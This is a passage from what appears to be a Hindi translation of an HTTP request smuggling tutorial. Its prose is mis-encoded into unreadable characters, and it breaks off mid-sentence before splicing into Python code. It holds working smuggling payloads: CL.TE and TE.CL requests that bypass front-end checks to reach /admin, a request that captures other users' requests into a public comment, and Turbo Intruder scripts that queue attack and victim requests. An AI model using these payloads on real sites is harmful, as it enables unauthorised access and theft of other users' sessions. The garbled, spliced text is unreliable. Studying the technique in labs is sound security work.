* "рд╣рдорд▓рд╛" рдЕрдиреБрд░реЛрдз рдФрд░ "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рдХреЛ рдЬрд┐рддрдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХреЗ рдПрдХ рд╣реА URL рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╛рдореЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХрдИ рдЖрдзреБрдирд┐рдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ URL рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдлреНрд░рдВрдЯ-рдПрдВрдб рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рд░реВрдЯ рдХрд░рддреЗ рд╣реИрдВред рдПрдХ рд╣реА URL рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рдмрдврд╝ рдЬрд╛рддреА рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдПрдХ рд╣реА рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рд╣рдорд▓реЗ рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред
* "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рддреЗ рд╕рдордп "рд╣рдорд▓рд╛" рдЕрдиреБрд░реЛрдз рд╕реЗ рдХрд┐рд╕реА рднреА рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЙрд╕реА рд╕рдордп рдЕрдиреБрдкреНрд░рдпреЛрдЧ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд╕рд╛рде рджреМрдбрд╝ рдореЗрдВ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдЖрдкрдХреЛ "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рдХреЛ "рд╣рдорд▓рд╛" рдЕрдиреБрд░реЛрдз рдХреЗ рддреБрд░рдВрдд рдмрд╛рдж рднреЗрдЬрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рд╡реНрдпрд╕реНрдд рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдкрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред
* рдХреБрдЫ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдореЗрдВ, рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдПрдХ рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдХрд┐рд╕реА рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд┐рдВрдЧ рдПрд▓реНрдЧреЛрд░рд┐рдердо рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЛ рдЕрдиреБрд░реЛрдз рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ "рд╣рдорд▓рд╛" рдФрд░ "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЛ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рд╣рдорд▓рд╛ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдпрд╣ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдХрд╛рд░рдг рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХрдИ рдмрд╛рд░ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдкрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред
* рдпрджрд┐ рдЖрдкрдХрд╛ рд╣рдорд▓рд╛ рдПрдХ рдмрд╛рдж рдХреЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рдирд╣реАрдВ рдерд╛ рдЬрд┐рд╕реЗ рдЖрдкрдиреЗ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреЗрдЬрд╛ рдерд╛, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рд╣рдорд▓реЗ рд╕реЗ рдПрдХ рдЕрдиреНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реБрдЖ рдерд╛ред рдпрджрд┐ рдЖрдк рдкрд░реАрдХреНрд╖рдг рдЬрд╛рд░реА рд░рдЦрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рд╕реЗ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдкрд░ рд╡рд┐рдШрдЯрдирдХрд╛рд░реА рдкреНрд░рднрд╛рд╡ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдЖрдкрдХреЛ рд╕рд╛рд╡рдзрд╛рдиреА рдмрд░рддрдиреА рдЪрд╛рд╣рд┐рдПред

### рд╣реЙрдк-рдмрд╛рдп-рд╣реЙрдк рд╣реЗрдбрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрдмрд░рджрд╕реНрддреА рдХрд░рдирд╛

рд╣реЙрдк-рдмрд╛рдп-рд╣реЙрдк рд╣реЗрдбрд░реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рд╣реЗрдбрд░ Content-Length рдпрд╛ Transfer-Encoding рдХреЛ рд╣рдЯрд╛ рджреЗрдВ рддрд╛рдХрд┐ HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХреЗ**ред
```
Connection: Content-Length
```
рд╣реЙрдк-рдмрд╛рдп-рд╣реЙрдк рд╣реЗрдбрд░реНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** рдпрд╣рд╛рдВ рдЬрд╛рдПрдВ:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

### рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдпрдВрддреНрд░рдгреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

рдХрднреА-рдХрднреА **рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╣реИрдВ**ред рдЖрдк HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдирд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк **рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рдкрд╛рдПрдВрдЧреЗ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк **рдмрд╛рд╣рд░ рд╕реЗ `/admin` рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╕рдХрддреЗ** рдФрд░ рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдЗрд╕рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣реА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ **рдкреНрд░реЙрдХреНрд╕реА рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### рдлреНрд░рдВрдЯ-рдПрдВрдб рдЕрдиреБрд░реЛрдз рдкреБрдирд░реНрд▓реЗрдЦрди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

рдХрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдореЗрдВ, **рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдХреБрдЫ рдкреБрдирд░реНрд▓реЗрдЦрди рдХрд░рддрд╛ рд╣реИ** рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рд╡реЗ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬреЗ рдЬрд╛рдПрдВ, рдЖрдорддреМрд░ рдкрд░ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░реНрд╕ рдЬреЛрдбрд╝рдХрд░ред\
рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ **рдЕрдиреБрд░реЛрдз рдореЗрдВ рд╣реЗрдбрд░** `X-Forwarded-For: <IP of the client>` рдпрд╛ рдХреБрдЫ рдЗрд╕реА рддрд░рд╣ рдХрд╛ рд╣реЗрдбрд░ рдЬреЛрдбрд╝рдирд╛ рддрд╛рдХрд┐ рдмреИрдХ-рдПрдВрдб рдХреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ IP рдкрддрд╛ рдЪрд▓ рд╕рдХреЗред\
рдХрднреА-рдХрднреА, рдЕрдЧрд░ рдЖрдк **рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реЗ рдирдП рдорд╛рди рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЬреЛрдбрд╝реЗ рдЧрдП рд╣реИрдВ** рддреЛ рдЖрдк **рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдЫрд┐рдкреА рд╣реБрдИ рдЬрд╛рдирдХрд╛рд░реА**/**рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдкреНрд░реЙрдХреНрд╕реА рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрд░реЛрдз рдХреИрд╕реЗ рдкреБрдирд░реНрд▓рд┐рдЦрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдПрдХ POST рдкреИрд░рд╛рдореАрдЯрд░ рдвреВрдВрдврдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдХрд╛ рдорд╛рди рдмреИрдХ-рдПрдВрдб рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░реЗрдЧрд╛** рдЙрддреНрддрд░ рдореЗрдВред рдлрд┐рд░, рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдВрддрд┐рдо рдПрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░реЗрдВ рдФрд░ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЕрдЧрд▓рд╛ рдЕрдиреБрд░реЛрдз `search=` рдХреЗ рдмрд╛рдж рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ рдпрд╣ рднреА **рдкреИрд░рд╛рдореАрдЯрд░ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рди рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ** рдЙрддреНрддрд░ рдореЗрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ **рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд╣реЗрдбрд░реНрд╕ рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░реЗрдЧрд╛**ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреЗрд╡рд▓ рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз рдХреЗ `Content-Length` рд╣реЗрдбрд░ рдореЗрдВ рдЗрдВрдЧрд┐рдд рд▓рдВрдмрд╛рдИ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХреА рдЬрд╛рдПрдЧреА**ред рдЕрдЧрд░ рдЖрдк рдХрдо рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреЗрд╡рд▓ рдХреБрдЫ рдмрд╛рдЗрдЯреНрд╕ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдВрдЧреЗ, рдЕрдЧрд░ рдЖрдк рд╕рднреА рд╣реЗрдбрд░реНрд╕ рдХреА рд▓рдВрдмрд╛рдИ рд╕реЗ рдмрдбрд╝реА рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз рдПрдХ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХ рджреЗрдЧрд╛ред рдлрд┐рд░, рдЖрдкрдХреЛ **рдЫреЛрдЯреА рд╕рдВрдЦреНрдпрд╛** рд╕реЗ **рд╢реБрд░реВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП** рдФрд░ рдЗрд╕реЗ **рдмрдврд╝рд╛рдирд╛ рдЪрд╛рд╣рд┐рдП** рдЬрдм рддрдХ рдЖрдк рд╕рднреА рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред\
рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ **рддрдХрдиреАрдХ TE.CL** рднреЗрджреНрдпрддрд╛ рдХреЗ рд╕рд╛рде рднреА рд╢реЛрд╖рдг рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рд▓реЗрдХрд┐рди рдЕрдиреБрд░реЛрдз рдХреЛ `search=\r\n0` рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдирдИ рдкрдВрдХреНрддрд┐ рд╡рд░реНрдгреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж рдорд╛рди рд╕рд░реНрдЪ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЬреЛрдбрд╝реЗ рдЬрд╛рдПрдВрдЧреЗред

рдЕрдВрдд рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рд╣рдо рдЕрднреА рднреА рдЦреБрдж рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдЬрд╛рди рд╕рдХреЗрдВ рдХрд┐ рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрд╕реЗ рдкреБрдирд░реНрд▓рд┐рдЦрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИред

### рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

рдЕрдЧрд░ рдЖрдк рдПрдХ POST рдЕрдиреБрд░реЛрдз рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕рд╣реЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ рддреЛ рдЖрдк рдЙрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЕрдЧрд▓реЗ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ рд╕реНрдЯреЛрд░ рдХрд░ рд╕рдХреЗрдВ:

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, **рдкреИрд░рд╛рдореАрдЯрд░ рдХрдореЗрдВрдЯ** рдХрд╛ рдорд╛рди **рдПрдХ рдкреЛрд╕реНрдЯ рдХреЗ рдХрдореЗрдВрдЯ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛** рдЬреЛ рдкреЗрдЬ рдкрд░ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдПрдХ **рдХрдореЗрдВрдЯ рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛**ред

_рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдПрдХ рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдХреЗрд╡рд▓ рдЙрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рд╡рд┐рднрд╛рдЬрдХ рддрдХ рдбреЗрдЯрд╛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдЧрд╛ рдЬреЛ рд╕реНрдордЧрд▓ рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред URL-рдПрдиреНрдХреЛрдбреЗрдб рдлреЙрд░реНрдо рд╕рдмрдорд┐рд╢рди рдХреЗ рд▓рд┐рдП, рдпрд╣ `&` рд╡рд░реНрдг рд╣реЛрдЧрд╛, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдиреБрд░реЛрдз рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рд╕рд╛рдордЧреНрд░реА рдкрд╣рд▓реЗ `&` рдкрд░ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдПрдЧреА, рдЬреЛ рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рднреА рджрд┐рдЦрд╛рдИ рджреЗ рд╕рдХрддрд╛ рд╣реИред_

рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ **рддрдХрдиреАрдХ TE.CL** рднреЗрджреНрдпрддрд╛ рдХреЗ рд╕рд╛рде рднреА рд╢реЛрд╖рдг рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рд▓реЗрдХрд┐рди рдЕрдиреБрд░реЛрдз рдХреЛ `search=\r\n0` рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдирдИ рдкрдВрдХреНрддрд┐ рд╡рд░реНрдгреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж рдорд╛рди рд╕рд░реНрдЪ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЬреЛрдбрд╝реЗ рдЬрд╛рдПрдВрдЧреЗред

### рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд XSS рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ

рдЕрдЧрд░ рд╡реЗрдм рдкреЗрдЬ **рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд XSS рдХреЗ рд▓рд┐рдП рднреА рднреЗрджреНрдп рд╣реИ**, рддреЛ рдЖрдк HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЗрдм рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рд╕реЗ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд XSS рдХреЗ рд╢реЛрд╖рдг рдХреЗ рдХреБрдЫ рдлрд╛рдпрджреЗ рд╣реИрдВ:

* **рдЗрд╕рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдХреЛрдИ рдмрд╛рддрдЪреАрдд рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**
* рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреБрд░реЛрдз рдХреЗ рдЙрди рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ XSS рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ **рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд╕рд╛рдорд╛рдиреНрдп рдкреНрд░рдд
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

рд╕реЗ: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

